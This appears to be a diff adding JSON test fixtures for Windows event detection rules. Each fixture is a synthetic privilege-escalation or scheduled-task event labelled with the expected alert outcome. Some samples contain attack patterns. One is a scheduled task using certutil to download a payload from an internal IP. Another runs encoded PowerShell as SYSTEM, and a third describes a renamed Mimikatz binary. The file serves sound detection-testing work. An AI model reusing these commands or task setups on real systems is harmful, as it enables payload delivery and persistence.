@@ -1,0 +1,68 @@
+[
+  {
+    "_comment": "SHOULD TRIGGER: Unknown process enabling SeDebugPrivilege",
+    "EventCode": 4703,
+    "host": "CORP-WRK-099",
+    "SubjectUserName": "CORP\\jdoe",
+    "ProcessName": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\update_helper.exe",
+    "ProcessId": "0x1a4c",
+    "PrivilegesAdded": "SeDebugPrivilege",
+    "PrivilegesRemoved": "-",
+    "timestamp": "2024-11-14T22:45:10Z",
+    "expected_result": "ALERT — Unknown unsigned binary enabling SeDebugPrivilege after hours"
+  },
+  {
+    "_comment": "SHOULD TRIGGER: Mimikatz renamed as svchost enabling SeDebugPrivilege",
+    "EventCode": 4703,
+    "host": "CORP-SERVER-02",
+    "SubjectUserName": "CORP\\svc_backup",
+    "ProcessName": "C:\\Windows\\Temp\\svchost.exe",
+    "ProcessId": "0x2f80",
+    "PrivilegesAdded": "SeDebugPrivilege",
+    "PrivilegesRemoved": "-",
+    "timestamp": "2024-11-14T03:10:00Z",
+    "expected_result": "ALERT — svchost.exe in Temp directory is not legitimate"
+  },
+  {
+    "_comment": "SHOULD NOT TRIGGER: Visual Studio debugger (legitimate developer use)",
+    "EventCode": 4703,
+    "host": "DEV-WRK-015",
+    "SubjectUserName": "CORP\\dev_alice",
+    "ProcessName": "C:\\Program Files\\Microsoft Visual Studio\\2022\\devenv.exe",
+    "ProcessId": "0x3b20",
+    "PrivilegesAdded": "SeDebugPrivilege",
+    "PrivilegesRemoved": "-",
+    "timestamp": "2024-11-14T10:15:00Z",
+    "expected_result": "NO ALERT — devenv.exe is whitelisted"
+  },
+  {
+    "_comment": "SHOULD TRIGGER: Standard user creating SYSTEM-privileged scheduled task with PowerShell",
+    "EventCode": 4698,
+    "host": "CORP-WRK-077",
+    "SubjectUserName": "CORP\\mwilson",
+    "TaskName": "\\Microsoft\\Windows\\WindowsUpdate\\Helper",
+    "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-EncodedCommand cwBhAG0AcABsAGUA</Arguments></Exec></Actions><Principals><Principal><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals></Task>",
+    "timestamp": "2024-11-14T16:30:00Z",
+    "expected_result": "ALERT — Standard user creating SYSTEM task with encoded PowerShell"
+  },
+  {
+    "_comment": "SHOULD TRIGGER: Non-admin creating task that runs certutil (LOLBin)",
+    "EventCode": 4698,
+    "host": "CORP-WRK-033",
+    "SubjectUserName": "CORP\\temp_contractor",
+    "TaskName": "\\CertificateUpdate",
+    "TaskContent": "<Task><Actions><Exec><Command>certutil.exe</Command><Arguments>-urlcache -f http://192.168.1.200/payload.exe C:\\Windows\\Temp\\update.exe</Arguments></Exec></Actions><Principals><Principal><UserId>CORP\\temp_contractor</UserId></Principal></Principals></Task>",
+    "timestamp": "2024-11-14T11:05:00Z",
+    "expected_result": "ALERT — certutil LOLBin used in scheduled task command"
+  },
+  {
+    "_comment": "SHOULD NOT TRIGGER: Software installer creating a maintenance task as SYSTEM",
+    "EventCode": 4698,
+    "host": "CORP-WRK-101",
+    "SubjectUserName": "NT AUTHORITY\\SYSTEM",
+    "TaskName": "\\Adobe\\Adobe Acrobat Update Task",
+    "TaskContent": "<Task><Actions><Exec><Command>C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe</Command></Exec></Actions><Principals><Principal><UserId>S-1-5-18</UserId></Principal></Principals></Task>",
+    "timestamp": "2024-11-14T14:22:00Z",
+    "expected_result": "NO ALERT — Created by SYSTEM account (excluded), known software path"
+  }
+]
